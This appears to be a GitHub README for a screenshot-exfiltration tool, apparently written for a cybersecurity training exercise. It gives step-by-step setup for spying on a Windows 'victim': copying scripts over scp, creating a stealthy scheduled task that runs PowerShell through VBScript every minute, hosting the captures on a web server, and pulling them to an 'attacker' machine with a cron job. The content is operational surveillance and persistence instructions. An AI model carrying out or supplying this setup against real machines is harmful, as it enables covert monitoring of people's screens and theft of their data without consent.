# Screenshot Exfiltration Method

## Description
This project demonstrates a method for exfiltrating screenshots from a Windows machine to a Linux attacker machine. It involves using PowerShell to take screenshots, VBScript to run the PowerShell script stealthily, creating a scheduled task on the victim machine to run the VBScript at regular intervals, and a shell script to automate the download on the attacker's machine.

<p align="center">
  <img src="https://github.com/LukeWait/screenshot-exfiltration/raw/main/images/screenshot-exfiltration-overview.png" alt="Overview Screenshot" width="600">
</p>

## Table of Contents
- [Files](#files)
- [Usage](#usage)
- [License](#license)
- [Acknowledgments](#acknowledgments)
- [Source Code](#source-code)
- [Dependencies](#dependencies)

## Files
- `screenshot.ps1`: PowerShell script to take screenshots.
- `hide_ps.vbs`: VBScript to run the PowerShell script stealthily.
- `screenshot_dl.sh`: Shell script for the attacker to automate the download of screenshots.

## Usage
### Prepare the Scripts
Before moving the scripts to the victim machine, you will need to modify the PATH's defined in the scripts.

1. **Edit the PowerShell Script**: Open `screenshot.ps1` with a text editor and change the `$saveLocation` path to the location where you want to save the screenshots. 
    - For the exfiltration process to proceed, you will need to either save them directly to a web server such as Apache (`/var/www/html`), or alternatively, you can save them to another location and create a symbolic link on the server. If there is no web server on the network or there is but you don't have access to it, you could instead start one directly on the victim machine.
    - The script doesn't use a unique identifier like a timestamp for the saved screenshots, therefore a new screenshot will overwrite the previously saved one. This is by design as it simplifies managing the directory that the screenshots are saved to, as they won't accumulate over time. Instead, we will exfiltrate them with the same time interval used to save, ensuring that we get screenshots before they are replaced.

2. **Edit the VBScript**: Open `hide_ps.vbs` with a text editor and change the `<PATH-TO>` to the location that the `screenshot.ps1` will be moved to on the victim machine.

### Setting Up on Victim Machine (Windows)
With the scripts prepared, move them to the victim machine and create a scheduled task to execute the taking of screenshots every minute. This Screenshot Exfiltration Method assumes you have access to the victim machine, which could be through a variety of methods/protocols, and includes any passwords required to make the connection. In this example, I'm using SSH.

1. **Transfer the Scripts**: On the attack machine, enter the following commands from the directory where you saved the scripts to copy them to the victim:
    ```sh
    scp hide_ps.vbs <USERNAME>@<VICTIM-IP>:/C:/<PATH-TO>
    scp screenshot.ps1 <USERNAME>@<VICTIM-IP>:/C:/<PATH-TO>
    ```
    - Change `<PATH-TO>` to the desired locations for the scripts. They can be placed in different locations if you wish, however, `screenshot.ps1` will need to be moved to the location you defined in the `hide_ps.vbs` file. 

2. **Access Victim Machine Directly**: To set up a scheduled task you will need access to the victim machine's command prompt. You will also need to ensure that the user you are connecting as has adequate permission to create scheduled tasks:
    ```sh
    ssh <USERNAME>@<VICTIM-IP>
    ```

3. **Create the Scheduled Task**: With the SSH connection established, use the following command to set up a scheduled task on the victim machine to run the `.vbs` script which will proxy the `.ps1` script every 1 minute:
    ```sh
    schtasks /create /tn "<NAME-THE-TASK>" /tr "wscript.exe C:\<PATH-TO>\hide_ps.vbs" /sc minute /mo 1
    ```
    - Ensure the `<PATH-TO>` aligns with the location where you placed the `hide_ps.vbs` file.

4. **Exit Remote Access**: You can now exit the SSH connection as the victim machine is now set up to take screenshots at regular intervals and save them to the location defined in the `screenshot.ps1` file. If this is a web server, you can proceed to exfiltrate them via the method provided.

### Exfiltrate on Attack Machine (Linux)
This process will set up automated retrieval of the screenshots. The provided script will name and timestamp them for easy identification.

1. **Prepare the Shell Script**: Ensure `screenshot_dl.sh` is executable:
    ```sh
    chmod +x screenshot_dl.sh
    ```

2. **Edit the Shell Script**: Open the `screenshot_dl.sh` script with a text editor and change the following sections:
    - `<PATH-TO-SCREENSHOTS-DIRECTORY>`: Specify a directory to save the screenshots.
    - `<NAME-OF-HOST>`: Specify the name of the host from which the screenshots were taken.
    - `<URL-OF-SCREENSHOT-FILE>`: Reflect the URL of the saved screenshot file (e.g., `https://<WEB-SERVER-IP>/<PATH-TO>/<FILE-NAME>.png`).
    
3. **Automate the Shell Script**: Use the time-based job scheduler `cron` to create a job to execute the script every 1 minute. Open the crontab file and add the following line to the end of the file before save/exit:
    ```sh
    crontab -e
    * * * * * ~/screenshot_dl.sh
    ```

4. **Verify Screenshots**: This completes the setup. Check the save directory defined in the `screenshots_dl.sh` file after a few minutes to see the screenshots coming in with appropriate timestamps.

## License
This project is licensed under the MIT License. See the LICENSE file for details.

## Acknowledgments
This project was developed as part of a cybersecurity training exercise.

Credit to CSch on FAQforge for the .vbs script: [How to Execute PowerShell Scripts Without Pop-Up Window](https://www.faqforge.com/windows/how-to-execute-powershell-scripts-without-pop-up-window/)

## Source Code
The source code for this project can be found in the GitHub repository: [https://github.com/LukeWait/screenshot-exfiltration](https://www.github.com/LukeWait/screenshot-exfiltration).


## Dependencies
Ensure you have:
- Network access to victim machine.
- Remote access tools like SSH for transferring and setting up scripts.
- Credentials of user with permissions to create scheduled tasks and execute scripts.
- Web server access or the ability to set up a web server on the victim machine for hosting screenshots.
